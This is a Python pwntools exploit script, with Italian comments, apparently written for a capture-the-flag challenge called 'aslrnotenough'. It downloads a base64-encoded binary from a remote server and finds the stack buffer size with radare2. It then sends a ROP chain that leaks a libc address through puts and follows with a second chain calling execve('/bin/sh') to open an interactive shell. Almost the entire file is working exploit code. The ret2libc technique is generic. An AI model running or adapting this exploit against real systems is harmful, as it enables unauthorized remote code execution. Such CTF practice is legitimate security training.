#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aslrnotenough_libc
from pwn import *
from collections import Counter
from base64 import b64decode
import os
import stat
import sys
import r2pipe
import re


libc = ELF("./aslrnotenough_libc")

remotehost = ("131.114.59.19", 8194)


gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    return remote(*remotehost, *a, **kw)

#Sappiamo che l'eseguibile e' a 64 bit dalla libc
#Dall'errore che viene ricevuto si intuisce che:
# -La challenge e' uno script in python che esegue lo script /home/ctf/chall
# -Il dump in realta' e' un file ELF codificato in base64
# -L'elf viene generato volta per volta con funzioni diverse e buffer di lunghezza variabile
# -Lo script da errore indipendentemente dalla lunghezza della stringa di input e l'errore contiene una path con stringa in base64
# -L'errore e' probabilmente irrilevante
# -GOT cambia ma almeno l'ordine delle funzioni al suo interno no
# -Anche se PIE e' disabilitato il fatto che vengano inserite funzioni casuali all'interno sposta le cose, oppure il fatto che gli eseguibili mandati cambino

file_name = "./gift.elf"
file_dump = ""

addr_len = 8


io = start()

io.recvuntil("Content: b'")
file_dump = io.recvuntil("'\n", True)
        
if(file_dump == ""):
    sys.exit()

elf = b64decode(file_dump)
f = open(file_name, 'w+b')
f.write(elf)
f.close()

st = os.stat(file_name)
os.chmod(file_name, st.st_mode | stat.S_IEXEC)


exe = context.binary = ELF(file_name)


#Radare2 analysis
r2_obj = r2pipe.open(file_name, flags=['-2']) #No stderr
r2_obj.cmd('aa')
fun_list = r2_obj.cmd('afl')
main_addr_str = re.search("(.+?)   (.+?)main", fun_list).group(1)
main_addr = int(main_addr_str, 16)
disasm_main = r2_obj.cmd('pd @main')
array_size_str = re.search("@ rbp-(.+?)\n", disasm_main).group(1)
array_size = int(array_size_str, 16)

#It's ROP time
rip_offset = array_size + addr_len

R = ROP(exe)

R.call(exe.sym.puts, [exe.sym.got.printf])
R.call(main_addr)

payload = dict()

payload[rip_offset] = R.chain()

payload = fit(payload)

io.recvuntil("What's your name? ")
io.sendline(payload)

res = io.recvuntil("What's your name? ")
printf_addr = re.search(b"(\\x80.+?)\n", res).group(1)

libc_printf = u64(printf_addr.ljust(8, b"\x00"))
libc.address = libc_printf - libc.sym.printf

R= ROP(libc)

R.call(libc.sym.execve, [next(libc.search(b"/bin/sh")), 0, 0])

payload = dict()

payload[rip_offset] = R.chain()

payload = fit(payload)

io.sendline(payload)

io.interactive()


#Legacy
'''
str_len = 1

while(True):

    io = start()

    try:
        io.recvuntil("Content: b'")
        file_dump = io.recvuntil("'\n", True)
        io.recvuntil("What's your name? ")
    
    except EOFError:
        res = io.clean_and_log()
        print(res)
        break

    file_dump = ""

    io.sendline("a"*str_len)
    
    res = io.recvuntil("Bye")
    print(res.decode())

    if(b"Segmentation fault" in res):
        break
'''
